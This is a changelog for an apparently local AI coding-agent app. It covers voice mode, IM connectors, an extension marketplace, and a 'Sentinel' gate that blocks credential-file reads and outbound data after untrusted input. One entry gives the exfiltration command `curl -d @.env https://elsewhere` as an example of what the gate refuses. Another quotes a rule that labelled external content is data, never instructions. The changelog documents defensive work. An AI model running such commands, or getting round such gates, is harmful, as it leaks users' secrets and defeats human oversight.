# Changelog

All notable changes to this project are documented here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and the project aims at
[Semantic Versioning](https://semver.org/spec/v2.0.0.html) once it reaches 1.0.

## [Unreleased]

### Added

- **微信官方 ClawBot / iLink 通道有了桌面入口，二维码改由后端直接出图。**
  这条通道的后端（扫码登录 / 多账号 / 长轮询收发）上一步已经完成，但只能用
  curl 调；这轮把它放到了用户面前，同时去掉了「前端得自己渲染二维码」的需要：

  - `GET /api/weixin/login/qr.png` 用 `segno`（纯 Python，进了运行依赖）把登录
    二维码渲染成 PNG —— 手机能扫的真二维码，8px/模块 + 规范要求的 4 模块静默
    区。省略 `qrcode` 时内部先取一张新码再出图，一次请求就拿到图，并在
    `X-Weixin-Qrcode` 响应头里给出轮询用的 id；带 `?qrcode=<id>` 则复用会话并按
    id 缓存，不重复渲染。图片编码的只是 `liteapp.weixin.qq.com` 链接，响应里
    没有 token。
  - 左下角新增 **📱 微信** 入口（在 `SidebarFooter`，和语音 / 机器人并排），点开
    是右侧弹层 `WeixinPanel`：一键出码、轮询扫码状态（等待扫码 / 已扫码待确认 /
    需要配对码 / 过期重生成 / 已绑定）、二维码可点开放大、已绑定账号列表与删除、
    多账号「再扫一个」。任何未识别的 `status` 都落到「等待中」的提示上，不会白屏；
    后端不可达 / 超时 / 非 200 时显示可读错误，不抛异常。
  - 新增 30 个 i18n 键（`web/src/i18n/parts/weixin.json`），组件里没有硬编码中文。
    61 个 catalog 因此暂时从 100% 降到 1336/1366（约 97.8%），缺口恰好是这些新键，
    未翻译前按既有回退规则显示英文。

- **Voice mode.** The synthesis engine has been in `kairos/voice.py` since early
  on — several hundred neural voices, no key, no account to create — and nothing
  called it: no endpoint, and a settings field that was a text box nobody read.
  It is wired up now. `GET /api/voice/voices` serves the list, with the
  browser's own voices kept as a second group and as the fallback for when the
  server has no engine or no network; `POST /api/voice/speak` returns the audio
  for a reply; the voice panel picks from the real list instead of asking you to
  type a voice name. Pace, pitch and volume reach the engine rather than
  being accepted and dropped.

  Voice mode is also a change of register, not just a speaker: with it on, the
  chat path tells the agent its answer will be heard rather than read, so the
  reply is written short and without Markdown in the first place. Whatever still
  arrives as a wall of text is distilled on the way to the speaker —
  `kairos/voice_text.py` drops fenced code, tables, links and list bullets,
  keeps whole sentences up to a budget, and cuts at the `Details:` marker the
  directive asks for, so the specifics stay on screen and the summary goes to
  the ear. The reply itself is unchanged; only what is spoken is trimmed.

  The frozen desktop build installs the new `tts` extra. `voice` also carries
  the speech-*in* half (`faster-whisper`), and an executable that ships a model
  runtime it never uses is larger for no reason. For the same class of reason
  the persisted v1 voice setting is cleared on upgrade: it named an English
  voice, which reads a Chinese reply in English. An empty name now means "match
  the reply's language", and a voice the user actually chose is left alone.

  With voice mode on, the chat is hands-free. The mic opens by itself whenever
  the agent is idle; a phrase is submitted after five seconds of quiet rather
  than when the user reaches for the mouse; the mic is taken away while the
  agent works — otherwise the recogniser transcribes the agent's own voice and
  sends it back — and reopened when the reply is done. The box is emptied for
  each turn, and a refused microphone is never retried: one denial would
  otherwise become a restart loop.

- **Bots: many IM accounts, one deployment, and no crossed wires.** A connector
  that drives a chat client — a personal WeChat login, say — lives outside this
  repository on purpose: it holds a login, it injects into one desktop client
  build, and neither belongs in an open-source tree. What the app owes it is a
  protocol, and what the user owes themselves is a way to see it. Both are here:
  `kairos/im_accounts.py` holds the accounts, the per-conversation bindings and
  the reply queue, and `api/routes/im.py` exposes them.

  Two small, load-bearing decisions make "several accounts at once" safe.
  Bindings are keyed `(account_id, chat_id)` rather than by chat id alone — the
  Feishu table keys on `chat_id`, and two accounts that happen to see the same
  opaque id would silently share a workspace. And the app never sends anything
  itself: it queues the reply and the connector that owns that account's login
  collects it, so a message cannot physically leave through the wrong account.
  Collection does not consume — the connector acknowledges after sending, so a
  crash mid-send repeats a line instead of losing one — and both the queue and
  the acknowledgement are scoped to a single account, since an unscoped ack
  would let one connector mark another's mail as delivered.

  Every conversation gets its own project, which already means its own workspace
  directory, agent instance and checkpoints; that is the isolation boundary, not
  a second mechanism beside it. Connectors authenticate as exactly one account,
  with an HMAC over the timestamp and body that is keyed by that account's own
  secret (five-minute window, so a captured request is not replayable), and fail
  closed on every count: unknown account 404, disabled account 403, account with
  no secret 403, bad or stale signature 401.

  Voice mode and the bot connector open from the **bottom-left of the rail**,
  next to Settings and the theme switch: both are things you reach for while
  working, and the drawer had grown a tab for each. The connector panel shows
  the three endpoints — inbound, outbound, acknowledge — before it shows
  anything else, with a real account id filled in once one exists: an endpoint
  you cannot find is an endpoint that does not exist. `scripts/im_connector_sim.py` is the reference
  connector, and runs the whole path (create an account, send a message, collect
  the reply) with no chat client involved.

  Connecting is **one button and one QR code**. The user clicks; the app makes a
  five-minute pairing; the connector on their machine claims it, uploads the
  chat client's own login QR, and reports the account it is now logged in as;
  the account exists, with a secret this side generated and handed over in that
  same handshake. Nobody has to invent an account id before their chat client
  has even logged in, and nobody copies a secret into a config file. The account
  id, the secret and the endpoints stay on the panel — they are what the
  *connector* needs, not what the user should have to produce. The simulator's
  `pair` command plays the connector's half, so the whole handshake can be
  walked through locally.

  Both this panel and the Voice one above are worth a note on their own account:
  each existed as a component while nothing mounted it, so neither could be
  reached from the UI at all — and the tests that did exist rendered the panel
  directly, which cannot see that. Their tests ask the rail now, and assert why
  the panel exists (the endpoints, the switch) rather than that it renders.

  The voice panel also lost three knobs it never needed: an engine dropdown with
  one real answer, and a speech-to-text provider and language box configuring a
  path nothing used — the composer's mic runs the browser's own recogniser.

### Fixed

- **A reply asked to be spoken is no longer silently dropped.** The server
  engine answered, the audio went to an `<audio>` element, and `play()` refused
  — which is what autoplay policy does before anything has been played from the
  origin. The rejection propagated instead of falling back, so the one failure
  this module exists to cover (voice mode on, nothing audible) was the one it
  did not survive. It now falls through to the browser voice and always clears
  its "speaking" state.
- **Saving the voice panel no longer fails.** The drawer saves all five settings
  sections in one request, and the panel's five new fields (`voiceMode`, `rate`,
  `volume`, `pitch`, `engine`) were not declared on the server-side
  `VoiceSettings`. The request answered 500 with `TypeError: VoiceSettings.__init__()
  got an unexpected keyword argument 'voiceMode'` — and because the sections
  travel together, the provider keys in that same payload were lost with it.
  Both halves now have a test that posts exactly what the panel posts.
- **The chat page has a microphone.** The composer's mic runs the browser's own
  recogniser, because there is no server-side speech-to-text to call
  (`sttProvider` is `"mock"` and no engine ships): it writes what it hears into
  the message box the user was already typing in, and records nothing. It is
  absent where no recogniser exists rather than present and inert, and it returns
  to its idle state when the recogniser stops on its own — silence, a refused
  permission — not only when the user clicks it off.

### Fixed

- **在设置里保存一次，真密钥就可能被遮罩串覆盖，下一次 LLM 调用 401。**
  Settings 抽屉把 `apiKey` 渲染成 `sk-1234...abcd` 的形状，保存时回传的是这个
  占位串；`SettingsStore.update()` 之前对该字段不做校验地 merge，占位串会被当成
  真值写回 `settings.json` —— 下一次调用就是 `AuthenticationError`。现在在补丁
  入口统一摘掉「看起来是遮罩（含 `...` / `***` / `…` / `•`）或为空」的 `apiKey`，
  保留磁盘上已有的值；同一个补丁里的其他字段（model / baseUrl / endpointUrl 等）
  照旧生效。注意这是有意的取舍：**清空密钥字段不再能删掉已存的密钥**，需要清空
  请直接改 `settings.json`。覆盖 3 个回归测试：嵌套 `provider.openai` 写法、
  顶层 `provider_openai` 写法、以及空串不清空。

### Removed

- **左下角的「机器人」入口（通用连接器配对）。** 个人微信现在走原生 iLink 通道
  （📱 微信），这个入口只剩一条通往通用连接器 API 的死路，按用户要求去掉。同组
  的语音、微信、设置、主题都在原位；`RobotPanel` 的实现仍留在 `SettingsDrawer.tsx`
  里，但已经没有入口能到达它。

## [0.1.7] - 2026-09-29

### Added

- **A preset for a router you host yourself.** FreeLLMAPI
  ([`tashfeenahmed/freellmapi`](https://github.com/tashfeenahmed/freellmapi), MIT)
  stacks the free tiers of many providers behind one OpenAI-compatible `/v1`.
  Pointing Kairos at it is now a dropdown entry instead of a typed URL: the preset
  fills `http://localhost:3001/v1/chat/completions` and deliberately leaves the
  model field empty. Its catalogue belongs to the router — the list comes from the
  router's live `/v1/models` — so nothing it aggregates is copied in here, neither
  in the preset nor in `kairos/providers_more.py`, where the entry ships no models
  either. Two tests hold that line, one on each side.

- **Artifacts: what a run produced, as things you can answer.** A round's plan,
  its result, a screenshot the browser tool took — the loop has always produced
  these, and the UI has always shown them as lines scrolled past in a
  transcript. `kairos/artifacts.py` keeps them as rows with a kind, a title, a
  body and a thread; the durable tick writes one plan and one result per round,
  and the browser tool's screenshot branch writes one per shot. `/artifacts`
  lists them, opens them and takes comments, and `GET /api/artifacts/{id}/file`
  serves the image behind a screenshot — only files under the app's own data
  directory, and only images, because a path that came out of a database row is
  not a promise. Best effort by construction: with no database, every producer
  returns None rather than failing the round that produced it.

- **An issue can become a project.** `POST /api/hooks/github` and
  `POST /api/hooks/linear` take signed deliveries and create the project.
  Verification is HMAC with a constant-time compare; secrets come from the
  environment (`KAIROS_HOOK_GITHUB_SECRET`, `KAIROS_HOOK_LINEAR_SECRET`), and
  with no secret configured the endpoint answers **503 instead of accepting
  anything**. The project list is the ledger — the issue id is written into the
  description as `[github#7]`, so a redelivery finds the project instead of
  making a second one, and an event we do not act on is answered 200 so the
  provider stops retrying. `GET /api/hooks/status` reports which doors are open
  without echoing a secret. It deliberately does not start the loop: creating a
  project is reversible, spending tokens is not.

- **`har` could be resumed from a terminal only — now the app drives it.**
  `kairos/har.py` has been the durable-task contract since Round 29: a goal that
  does not change, a round count, a plan, a history, a lock. It had **no caller
  outside its own CLI**, so "kick off a multi-day refactor, close the laptop,
  pick it up tomorrow" meant opening a terminal. `kairos/durable.py` binds the
  contract to the project's real Coder/Reviewer loop and `api/routes/tasks.py`
  exposes it; `GET /api/tasks/{project}` also lists the background subagent
  handles and autonomous jobs that were previously only discoverable if you
  already knew the handle.

  - `har.resume_async` is the same state machine with an **awaited** tick. The
    sync `resume()` stays for the CLI and the tests; it could not be reused here
    because the tick drives the project's loop, whose HTTP clients belong to the
    app's event loop — hopping to a worker thread to satisfy a sync signature
    hands those clients a different loop, which is a hang rather than an error.
  - A tick is one run of the real loop, and state is saved after each one, so an
    interrupted tick loses only the round in flight.

- **The gate can ask.** `kairos/approval.py`'s ladder returns ASK for actions
  that are neither clearly safe nor clearly forbidden, and until now an ASK had
  to be resolved by policy: allowed when the gate is not strict (so the ladder
  was only advice) or refused when it is (so the first file write deadlocks a
  run). `kairos/sentinel.py`'s own docstring named the missing piece — "ASK mean
  deny once an approval channel exists". `kairos/approvals.py` is that channel:
  `Sentinel.authorize_async` publishes the question, the tool call waits up to
  120 seconds, and the answer decides. Approving may record the same standing
  rule `POST /api/sentinel/allow` writes; denying, or never answering, is a
  refusal — an approval that never arrives must not become a permission. The
  prompt is mounted with the layout, so the question follows the user to
  whichever page they are on. The sync `authorize()` is untouched: a CLI run has
  nobody to ask, and a call that parks on a question nobody will see is worse
  than a verdict.

- **A Tasks screen — and a page the sidebar had always linked to.** `/tasks`
  shows the durable task (goal, round, score, approval, round history) with
  one-round and five-round resume buttons, beside the background subagents and
  autonomous jobs. It is deep-linkable (`?project=<id>`), like Run and History.
  Adding it surfaced a dead link: the sidebar has linked `/dashboard` since
  R38.13 and **no route ever served it** — the page existed, the route did not.
  All 37 new strings are translated for all 63 languages (1281/1281 keys, 100%).

- **Two capabilities the agent was promised and never had: `browser` and
  `computer_use`.** `kairos/browser.py` and `kairos/computer_use.py` both
  shipped with unit tests and **no caller** — the agent's toolset was twelve
  tools and none of them was a browser — while the bundled `computer-use` skill
  told every model "You have a `computer_use` tool that drives the user's
  desktop". A skill that promises a tool the registry does not contain is not a
  documentation bug: the model plans against it and fails at the first step.
  Both are real tools now.

  - `browser` drives the **same** per-project Chromium context the Browser tab
    shows, so a navigation the model performs appears there live and its
    screenshot is of the page the user is already looking at. Actions:
    `navigate`/`open`, `click`, `type`, `key`, `evaluate`, `content`, `console`,
    `current`, `screenshot`, `viewport`, `back`/`forward`/`reload`, `close`.
    `content` exists because a text-only model cannot read a PNG — it returns
    the page's visible text. URLs pass the lenient SSRF guard
    (`validate_config_url`): the loopback and LAN hosts a developer legitimately
    verifies are allowed, cloud metadata and unresolvable hosts are not.
    Screenshots are written under the app's data directory, never into the
    project workspace, so browsing cannot dirty the tree the Reviewer reads.
  - `computer_use` exposes the desktop backend that already existed: `capture`,
    `screen_size`, `click`, `move`, `type`, `key`, `scroll`, `history`, plus
    `dry_run`. Every result names the backend that ran, because the default is
    `MockComputerUse` — a mock that silently reports "clicked" is worse than no
    tool at all.
  - Both are wired in `Orchestrator._create_agents`: the Coder gets both, the
    Reviewer gets the browser (verifying a UI is a review question). A machine
    without Playwright degrades to a Coder without a browser, not to no Coder.

- **The gate covers the new tools on the same terms as everything else.**
  `browser` is a network tool, so reading a page taints the run; a screenshot is
  not egress, but a navigation, a click or a keystroke is, and is refused in a
  tainted run. `computer_use` is a new taint source (`screen`) — the pixels
  belong to whatever application happens to be open — and capturing or reading
  the history stays allowed while clicking and typing are egress. Judging these
  two by tool name alone would have blocked the screenshot the agent needs to
  describe its own work.

- **The precheck runs a type check where the project is configured for one.**
  mypy runs on the changed files when the project has a mypy config, and a
  locally installed `tsc --noEmit` when `tsconfig.json` and
  `node_modules/typescript` are both present. An unconfigured project gets no
  type check — an unconfigured mypy reports hundreds of pre-existing complaints
  the Coder cannot tell from its own — and nothing here can reach the network:
  `npx tsc` would download the compiler, so it is never used.

- **The bundled skill library is now checked against the tool registry.** 547 of
  the bundled skills were imported from other harnesses, and the `computer-use`
  skill was not the only one naming tools that do not exist here. A test freezes
  the list of skills that reference a foreign vocabulary (Hermes' `mode="som"` /
  `cua-driver`, Claude Code's `Task(` / `TodoWrite`), fails when a new import
  adds one, and fails when the list rots. The three that promise a desktop or
  browser tool carry a reality-check header naming what actually exists.

- **A gate every tool call passes through — the idea is Muse's Sentinel, adapted
  to a local agent.** Meta's Muse runs each user in an isolated cloud VM with a
  separate authority that gates actions and network egress, which the agent can
  propose to but never override: it lets the agent work unattended without
  handing it the machine. This project had the same intent written down — a
  `PermissionPolicy`, an approval-mode ladder — and **no call site**: the policy
  was constructed in one API route and consulted by nothing. `kairos/sentinel.py`
  is now that one place, and it lives at the single choke point where built-in
  tools *and* MCP tools (they are exposed as `BaseTool` adapters) reach the
  outside world, so a refusal cannot be routed around by choosing another tool.

  What it enforces, in order: the user's own `deny`/`allow` rules outrank
  everything; private keys, cloud credentials, `.netrc`/`.git-credentials` and
  this app's own key store are refused in every mode; and — the part taken
  straight from Muse — **tainted egress**: once a run has read content it cannot
  vouch for, actions that *send data out* are refused. What taints a run is
  calibrated for a coding agent rather than for Muse's payments-and-email agent:
  the network and third-party MCP servers taint a run, local reads do not,
  because tainting on the repository the agent was asked to edit would refuse
  every write and teach the user to switch the gate off. In a tainted run a
  fetched page still gets summarised, the tests still run, the commit still
  lands; `curl -d @.env https://elsewhere` does not. A refusal comes back to the
  model as a tool error that names the rule and the user's options, and tells it
  not to look for another route.

- **Untrusted content is labelled where it re-enters the context.** Tool results
  from the network or from a third-party MCP server are wrapped in
  `<untrusted_content source="...">`, and the system prompt states that anything
  inside is data to reason about, never instructions. Muse labels external input
  in its harness for the same reason: the model should be able to tell a page
  from the user.

- **A gate API and an audit trail.** `GET /api/sentinel/audit` returns recent
  rulings with a tally of refusals; `GET /api/sentinel/status` reports what is
  being enforced; `POST /api/sentinel/allow` records a standing rule the user
  grants, which is the escape hatch a refusal points at. The trail stores a
  fingerprint of each call's arguments rather than the arguments themselves —
  credential-shaped substrings are redacted before anything is written, in the
  resource field as well as the reason — because an audit trail that keeps raw
  tool arguments is a new place for secrets to collect.

- **The gate reaches subagents.** A child is built with the parent's tracker and
  refuses tainted egress on its own account: fan-out must not be a way to act on
  what the parent read.

### Fixed

- **`computer-use` described a tool that is not this one.** The skill was
  imported from Hermes verbatim, 382 lines of it: it taught a `mode="som"`
  capture, element indices, `capture_after=True`, a `cua-driver` binary and a
  background-delivery contract that never steals focus. None of that exists in
  this project. The tool that does exist moves the real cursor, so the skill
  now says so, and documents this tool's actions instead.

- **A policy nothing consults is decoration.** `PermissionPolicy` and the
  approval ladder existed, were tested in isolation, and were wired to no
  execution path at all — `decide()` had no callers outside its own re-export.
  A `deny` rule a user wrote changed nothing about what the agent did. It is now
  enforced at the choke point, with tests that fail if the wiring is removed.

- **An MCP server was started with the host's entire environment.** The child
  was spawned with `{**os.environ, ...}`, so every key a user had ever exported —
  provider keys, cloud credentials, database passwords — was readable by any
  third-party server, and by anything that managed to run inside one. Children
  now receive an allowlist of what they need to run plus whatever the server's
  own definition declares (naming a token in `mcp.yaml` is an explicit decision,
  so it still passes), and credential-shaped variables are withheld even if one
  reaches the allowlist. `KAIROS_MCP_INHERIT_ENV=1` restores the old behaviour
  for a server that genuinely needs it.

- **A stale system proxy made the marketplace look offline.** Windows hands every
  process the proxy in the registry. A leftover entry — `ProxyEnable=1` pointing at
  `127.0.0.1:7897` after the tool that owned it stopped — refuses every connection
  with `WinError 10061`, and the marketplace reported each remote source as
  unreachable: the plugins and skills tabs, which default to remote sources, came
  up empty with "由于目标计算机积极拒绝，无法连接" and no listing. Outbound
  marketplace fetches now try a direct connection first and fall back to the
  configured proxy, logging which one was used, so a proxy a user actually runs
  still works while a dead one stops being fatal. Measured from a machine with the
  stale entry: all six sources failed before, four now return entries, and
  Smithery fails with a real network timeout rather than a refusal.

- **A browser that opened onto a port nobody was listening on.** Starting the app
  waited for every MCP server the user had configured: the servers were started
  inline while `api.app` was still being imported, before uvicorn owned a port.
  With five configured servers — four whose command is not installed, one that has
  to reach a network it cannot — that was **129 seconds** of "127.0.0.1 refused to
  connect", because the launcher gives up waiting after 30 and opens the browser
  anyway. The start phase also ran twice, so one 50s timeout became two. Startup
  now serves first and warms the servers on a background task: the port opens in
  about **four seconds** and the servers arrive when they arrive. `start_all` is
  idempotent, so entering the phase twice no longer respawns a server that is
  already answering or retries one that already failed this session. The deferral
  is opt-in — the API layer asks for it before building its orchestrator — so a CLI
  run, `kairos demo` and any library caller still start their servers inline
  exactly as before. The launcher waits up to 180 seconds for the port, and still
  opens the browser when that expires, so a genuinely broken start stays visible
  instead of silent.

- **The marketplace called things installed that were not, and said nothing
  about things that were.** Both tabs answered from bookkeeping files: the plugin
  list from `plugins.json` (a catalogue of what *can* be installed) and the
  skills list from `installed.json` (one install script's 29 records). So the
  plugins tab drew a green tick against all 20 catalogue entries whether or not
  anything was behind them, the "Installed here" count was a catalogue size
  rather than a state, and a plugin or a skill installed from a remote source —
  the only kind this page can install — did not appear as installed anywhere,
  including on the row the install had just come from. Both endpoints now read
  the running system. `/extensions/plugins` returns what this build ships, what
  the user added and what the registry could still install, each with
  `installed` and an `origin` (`bundled` / `user` / `registry`);
  `/extensions/skills` returns what the loader actually discovers, with `scope`
  and the frontmatter `category`, and reports a record whose file is gone as
  missing instead of silently dropping it. The count is that number now — 7
  plugins and 581 skills on a working install, against 20 and 29 before. Remote
  rows match an entry on its name *and* its upstream id, so a Cline entry that
  installs under its id is recognised as installed too.

- **A marketplace for the three kinds of extension.** MCP servers, plugins and
  skills each had a list somewhere and no way to act on it: installing a server
  meant hand-editing `mcp.yaml`, and there was nowhere that answered "what else
  could this thing do?". The new page (`/marketplace`) puts all three behind one
  tabbed view. Installing an MCP server writes it into the user's `mcp.yaml`
  atomically and only touches that one entry, so an existing configuration
  survives; uninstalling removes just that entry. Bundled servers are marked as
  such because they need no download and work with the network unplugged.
  Plugins are listed with what they contribute (they load from disk, so there is
  nothing to install) and skills are searchable by name, category and text.

- **The marketplace reaches beyond what we shipped.** A curated list of 26 servers
  answers "is anything installed?" and not "is there anything else?", so the MCP
  tab now has a source selector. Two remote marketplaces are wired up, and only
  two, because these are the ones that survive being checked rather than read
  about: the **official MCP registry** (`registry.modelcontextprotocol.io` —
  public API, no sign-in, and entries that carry an npm package plus
  `runtimeHint: npx` for a local server or a `remotes[].url` for a hosted one) and
  the **Cline marketplace** (`github.com/cline/marketplace`, entries with explicit
  `install.args[]` / `install.env[]`, fetched through jsDelivr because
  `raw.githubusercontent.com` is unreliable from mainland China). Both are
  normalised into the same shape the curated registry uses and installed through
  `install_entry`, so a remote server lands in `mcp.yaml` exactly as a curated one
  does — credentials written as `${VAR}` references, never literals. Entries with
  neither a launcher nor a URL are still listed, with a link to their homepage and
  a disabled button instead of an Install that could not work, and a source that
  cannot be reached says so rather than showing an empty list that reads as "no
  results". The two failure modes are the same one: never claim something works
  that has not been shown to.

- **"Test" on an MCP server really starts it.** The button sends a real request
  to a new `POST /extensions/mcp/probe`, which launches that one server and waits
  for an MCP `initialize` handshake, reporting the tools it exposes or the error
  it failed with. A server that is listed but cannot answer is worse than one
  that is absent — that is exactly how 0.1.5 shipped — so the marketplace can
  prove each entry works rather than asserting it.

- **The transcript shows how an answer was reached.** Messages are grouped into
  turns — your question, then a collapsible process block, then the reply — and
  the block summarises the run (`Process · 4 steps · 12.4s`, plus a count of
  failures). Each step is a row: thinking, or a tool call with its arguments, its
  outcome and **its own duration**, paired from the call and its result by turn
  and tool so two calls to the same tool don't borrow each other's timings. A
  call that has not returned yet reads as running and claims no duration. The
  block is open while the turn runs and folds away once the answer lands, unless
  you have opened or closed it yourself.

- **Replies are rendered as Markdown.** They were plain text with preserved
  whitespace, so code fences, lists and emphasis arrived as literal characters.
  The renderer is a small local module rather than a dependency: the app ships as
  a frozen binary and the bundle is part of it. It builds React elements rather
  than HTML, so a reply containing a script tag is text and a `javascript:` link
  stays inert.

- **The marketplace installs plugins and skills, from four more public sources.**
  The MCP tab could browse and install; plugins and skills could only be looked at,
  because there was nowhere to install them *from*. Wired up now: **Smithery**
  (17,061 MCP servers — its list endpoint names no endpoint URL, so the detail is
  fetched only for the entries actually returned, and an entry whose detail fails
  comes back marked non-installable with the reason rather than as a silent
  omission), **Cline's plugin and skill registries** (16 and 38), **Anthropic's
  official Claude plugin marketplace** (311 plugins across four different `source`
  shapes, all of them walked) and **`anthropics/skills`** (19). Each is normalised
  into the same entry shape and installed through one path.

  A Claude plugin converts to a Kairos plugin on install: `commands/`, `agents/`,
  `skills/`, `hooks/` and `.mcp.json` are copied, a `kairos-plugin.yaml` is written
  with `capabilities` derived from the directories that **actually exist** (a Claude
  plugin's manifest declares none of them — its components are found by directory
  convention, which is why the four ports this project already carried worked
  unchanged), `CLAUDE_PLUGIN_ROOT` is rewritten to the installed directory, and
  `ATTRIBUTION.md` records the upstream URL and the original manifest verbatim. A
  file that depends on a Claude-only facility is skipped and **named in the
  install's warnings** instead of being dropped quietly, and a plugin whose licence
  is not permissive is refused outright — installing `claude-security` today fails
  with "its licence looks like proprietary", which is the rule working as intended.

  Listings read the repository **tarball** rather than an index, because it is the
  only source measured to be both complete and unthrottled. jsDelivr's file API
  came back empty for whole plugin directories of this very marketplace
  (`claude-security` 42 files, `code-modernization` 29, `cwc-makers` 6 — all zero
  through the CDN), which would have installed an empty plugin and reported success.
  GitHub's git-trees API is authoritative but allows an anonymous caller 60 requests
  an hour, which is how a real install failed with `403 rate limit exceeded`. One
  3 MB download returns the listing and every file's contents together, so an
  install costs one request instead of one per file. The API stays as the fallback,
  and when both roads are closed the source says why — a source that cannot be
  reached must never look like a source with nothing in it. The Claude
  marketplace's own `marketplace.json` is read that way too: jsDelivr stopped
  answering from this network mid-session (three consecutive live loads returned
  `unreachable ([SSL: UNEXPECTED_EOF_WHILE_READING])`), and the source now lists
  all 311 plugins from the tarball with the CDN kept as the fallback.

### Changed

- **Replies no longer carry a role name.** The transcript printed "Kairos" above
  every agent reply and "审查员" above every reviewer reply. A name over a
  paragraph invites the reader to file the text under a person instead of judging
  it, and it has to be skipped on every single turn. The mark and the bubble
  already say who is speaking, so both labels are gone; the reviewer's score and
  approve/request-changes verdict stay, because that is the part that carries
  meaning. The same slot also stopped printing the pipeline's internal stage ids
  (`coder.summary`, `reviewer.summary`), which say the same thing in a rawer
  form — the trace view is where stage attribution belongs. Step rows keep their
  labels, because there "which step is this" is a real question.

- **The bottom-left rail is grouped and shows where you are.** It was nine
  same-weight icons behind an "Advanced" disclosure, with two rows in a different
  chrome — and, after all that, no indication of the current page. It is now
  three labelled groups (Navigate / Extensions / System) plus Preferences, all on
  one three-column grid so the column edges line up down the whole rail, with the
  current route marked the same way the active project is marked. Nothing is
  hidden behind a disclosure any more, and Settings and the theme switch share the
  same cell shape as every destination, because they are also one click. The
  column count comes from the longest label the rail has to hold — a screenshot
  check caught it truncating its own labels at four.

- **The i18n translator reports the work it did and fails when it did none.**
  `translate_i18n.py` printed `all validated` after a run in which every batch was
  rejected with HTTP 401 and not a single key was written — a catalog that gained
  nothing has no quality problems either, so the summary could not see the
  difference. It now reports how many keys it filled, and exits non-zero when
  batches failed, because a rejected key leaves the catalogs exactly as they were.



## [0.1.6] - 2026-09-17

### Fixed

- **The packaged app can start its MCP servers.** `mcp` is an optional extra, so
  PyInstaller never followed an import to it and the frozen builds shipped
  without it: the app came up, listed five bundled servers, and could not start
  one — `ModuleNotFoundError: No module named 'mcp'`. Every start burned the
  60-second budget on request timeouts before the UI was reachable, and the whole
  MCP layer, including the HTTP transport added in 0.1.5, was dead in the
  binaries and the wheel. The build now collects `mcp` and its submodules.

- **The smoke test asks a server to answer instead of counting them.** The check
  that should have caught that counted configured servers; it now launches two of
  them and requires a real `initialize` reply, failing the build if they don't.
  It probes only a frozen binary — a source install from core dependencies has no
  `mcp` and that is correct, and `--mcp-serve` is a flag only the frozen launcher
  understands.

- **The Anthropic form can fetch its model list.** The fetch control had grown
  inside the OpenAI form only, so selecting Anthropic in the LLM settings showed
  a bare text input and no way to ask the endpoint what it serves. It is now one
  component, rendered by both forms, so they cannot drift apart again. The
  protocol comes from the form rather than a hardcoded "openai" — the same
  hardcoding that made the backend's Anthropic branch unreachable and had it
  answer any Anthropic endpoint with a list of MiniMax models.

- **A test that only passed on Windows, and the CI that ran on Linux.** The
  updater fixture defaulted to a `windows-x86_64` asset while the updater selects
  with `platform_key()`, so on Linux it described a release with nothing this
  machine could use and the assertions died with a `TypeError` that read like a
  broken updater. The fixture now builds the asset for the platform it runs on,
  and two tests state the intended behaviour for all three platform keys.

- **One test's provider settings no longer leak into the next.** The drawer's
  reset between tests omitted `provider`, so an active provider, its URL and its
  key carried over.

### Security

- Nothing credential-shaped was imported from the other agents surveyed for
  0.1.5: four candidate files were refused by the gate rather than copied.

## [0.1.5] - 2026-09-16

### Third-party content

This release ships skills that were imported from other agents installed on the
author's machine; each carries `imported-from:` and a `source-path:`. Where the
source was a licensed plugin, the upstream LICENSE and an `ATTRIBUTION.md` are
included alongside it. Where it was another agent's own skill directory the
licence is not stated upstream — review those before redistributing this tree:

```bash
grep -rl '^imported-from:' kairos/skills | wc -l          # how many
grep -rh '^imported-from:' kairos/skills | sort | uniq -c # from where
```

Nothing read as a credential was imported: candidates containing a key-shaped
string were skipped rather than copied.

### Security

- **A credential gate guards the import.** Any candidate file containing a
  key-shaped string is skipped and logged rather than copied. Four were refused.
- **No machine-specific paths in the release.** A repo-hygiene test caught 46
  lines across 11 skills that carried drive letters, a user name, or notes about
  private projects (including the filenames of private secret files). The notes
  about this particular machine were dropped from the repo — their originals are
  untouched — and the reusable ones were rewritten. The public tree now carries
  no drive letters and no user names.

### Added

- **The skills, plugins and MCP servers the other agents already have.** A
  survey of every agent installed on this machine found 1941 distinct skill
  names. The 554 that are genuinely written to the SKILL.md spec — real content,
  a declared description — now ship with the app, each recording the agent it
  came from. Five plugins from the Claude Code marketplace (Apache-2.0 / MIT,
  verified before copying, upstream LICENSE and an ATTRIBUTION.md included)
  became bundled plugins, and the vendor-published MCP servers from that
  marketplace are in the registry: off by default, one line to enable, because
  each needs a runtime this build does not ship.

- **The capability view has a screen: Tools → Capabilities.** It shows what the
  agent actually has in the current project — skills with their scope, priority
  and whether they carry a trigger; the MCP servers that are configured, where
  each came from (your config, a project file, or the bundled defaults) and
  which ones were rejected *with the reason*; the servers this build runs itself
  with their tool names; the plugins it ships, next to the ones you installed
  and the ones the registry could install; the built-in tool list; and a
  **Problems** panel that names anything unusable. It reads the runtime on every
  open, so it cannot describe an install that is not there.

- **MCP servers can be remote again.** The client spoke stdio only, so the
  servers that actually exist in the world — hosted endpoints behind a token —
  could not be configured at all. `transport: http` (Streamable HTTP) and
  `transport: sse` now connect over the official SDK transports with the same
  surface as the stdio client, so the tool adapter and the registry cannot tell
  the two apart. Credentials ride in `headers` and may reference the
  environment (`"Authorization": "Bearer ${MY_TOKEN}"`); nothing is spawned,
  and a missing `url` fails loudly instead of being quietly ignored. Tested
  against a real Streamable-HTTP server started in-process — not a mock.

- **`GET /api/extensions/capabilities` — what the agent will actually have, and
  what is missing.** One read-only answer for a project: every skill the loader
  returns with its scope (project / global / bundled), priority and trigger; the
  MCP servers that are configured, which are rejected *and why*, and the offline
  servers this build ships with their tool names; installed plugins with their
  declared capabilities and compatibility; the native tool list; and a
  `problems` array that names what is unusable instead of dropping it. Header
  *names* are reported, never their values. `?probe=true` additionally starts
  the configured servers and reports live tool counts and startup errors.

  It exists because the registry and the runtime could disagree unobserved:
  `/extensions/summary` counted 29 installed skills while `SkillsLoader`
  returned none at all. The two endpoints are kept side by side on purpose —
  one describes the install, the other the running system.

- **`kairos doctor` counts every bundled server.** The bundled-server check
  skipped `filesystem` (which keeps its own tool table in an older module) and
  reported "11 tools" for what is really 16. The doctor and the capability view
  now resolve tool names through one function, so the two numbers agree.

- **A fresh install already has working MCP tools, from a plugin that ships
  with it.** The five servers Kairos serves itself — filesystem, git, sqlite,
  time, fetch, sixteen tools between them — used to be *bundled but
